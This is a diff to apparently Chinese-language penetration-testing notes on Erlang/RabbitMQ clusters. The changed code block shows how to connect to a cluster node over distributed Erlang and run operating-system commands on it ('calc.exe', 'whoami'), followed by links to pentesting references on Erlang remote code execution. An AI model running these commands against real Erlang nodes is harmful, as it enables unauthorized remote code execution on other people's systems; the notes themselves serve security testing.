@@ -586,12 +586,12 @@ demo
 + rabbit是要连接到的群集名称
 + WIN-PM0ID6F0AHN是我通过其连接到群集的主机名
 ```
-root@kali:~# erl -sname test //连接到test节点
-(test@kali)1> net_kernel:connect('rabbit@WIN-PM0ID6F0AHN'). //连接到群集（命令末尾的重要终止符的句点）
-(test@kali)2> erlang:spawn('rabbit@WIN-PM0ID6F0AHN',os,cmd,["calc.exe"]). //代码执行（当然是起始计算）
-(test@kali)1> os:cmd("whoami"). //代码执行
-init:stop().  //退出Erlang Shell是使用init:stop函数完成的
+erl -sname test //连接到test节点
 
+net_kernel:connect('rabbit@WIN-PM0ID6F0AHN'). //连接到群集（命令末尾的重要终止符的句点）
+erlang:spawn('rabbit@WIN-PM0ID6F0AHN',os,cmd,["calc.exe"]). //代码执行（当然是起始计算）
+os:cmd("whoami"). //代码执行
+init:stop().  //退出Erlang Shell是使用init:stop函数完成的
 ```
 + https://book.hacktricks.xyz/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd
 + https://securityboulevard.com/2018/09/erlang-authenticated-remote-code-execution/
